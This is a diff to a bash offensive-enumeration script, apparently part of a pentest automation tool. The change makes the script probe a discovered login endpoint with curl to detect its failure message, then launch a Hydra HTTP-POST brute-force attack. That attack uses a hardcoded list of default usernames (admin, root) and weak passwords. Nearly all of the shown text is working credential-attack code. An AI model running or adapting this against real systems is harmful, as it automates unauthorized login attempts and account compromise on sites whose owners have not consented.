@@ -288,13 +288,38 @@ run_enum_tools() {
         local AUTH_PATH=$(grep -iE 'login|admin|portal|monitoring' "$TARGETS_LIST" | grep -vE '\.(css|js|png|jpg|jpeg|svg|woff)' | head -n 1 | sed "s|http[s]*://$TARGET||g")
         
         if [ -n "$AUTH_PATH" ]; then
-            echo -e "${GREEN}[+] Authentication endpoint unmasked dynamically: $AUTH_PATH${RESET}"
-            echo -e "admin\nadministrator\nroot" > "$OUTDIR/web_users.txt"
-            echo -e "admin\npassword\ntoor\nWelcome\nPass123" > "$OUTDIR/web_passwords.txt"
-			print_hacker_banner "HYDRA"
-            run_with_timeout_skip "hydra -L $OUTDIR/web_users.txt -P $OUTDIR/web_passwords.txt -t 4 $TARGET http-post-form \"${AUTH_PATH}:username=^USER^&password=^PASS^:F=Failed|Incorrect|Invalid\" 2>&1 | tee \"$OUTDIR/web_login_brute.txt\"" 120
-            rm -f "$OUTDIR/web_users.txt" "$OUTDIR/web_passwords.txt"
-        fi
+	    echo -e "${GREEN}[+] Authentication endpoint unmasked dynamically: $AUTH_PATH${RESET}"
+	    echo -e "admin\nadministrator\nroot" > "$OUTDIR/web_users.txt"
+	    echo -e "admin\npassword\ntoor\nWelcome\nPass123" > "$OUTDIR/web_passwords.txt"
+	    
+	    # 1. Probe the login endpoint with dummy credentials to grab the failure page
+	    echo -e "[*] Probing $TARGET$AUTH_PATH for failure keywords..."
+	    PROBE_RESP=$(curl -s -X POST -d "username=testuser123&password=testpass123" "$TARGET$AUTH_PATH")
+	
+	    # 2. Extract the matched word exactly as it appears in the HTML (preserving case)
+	    MATCH_WORD=""
+	    for word in "Invalid" "invalid" "Failed" "failed" "Incorrect" "incorrect"; do
+	        if echo "$PROBE_RESP" | grep -q "$word"; then
+	            MATCH_WORD="$word"
+	            break
+	        fi
+	    done
+	
+	    # Fallback default if no common patterns are detected
+	    if [ -z "$MATCH_WORD" ]; then
+	        echo -e "${YELLOW}[!] Warning: No common error words matched in probe. Falling back to 'error'.${RESET}"
+	        MATCH_WORD="error"
+	    else
+	        echo -e "${GREEN}[+] Detected failure keyword: '$MATCH_WORD'${RESET}"
+	    fi
+	
+	    print_hacker_banner "HYDRA"
+	
+	    # 3. Run Hydra with the dynamically detected F= keyword
+	    run_with_timeout_skip "hydra -L $OUTDIR/web_users.txt -P $OUTDIR/web_passwords.txt -t 4 $TARGET http-post-form \"${AUTH_PATH}:username=^USER^&password=^PASS^:F=$MATCH_WORD\" 2>&1 | tee \"$OUTDIR/web_login_brute.txt\"" 120
+	    
+	    rm -f "$OUTDIR/web_users.txt" "$OUTDIR/web_passwords.txt"
+		fi
 
         # VHost Fuzzing Block
         echo "[*] Detecting standard host size variations..."
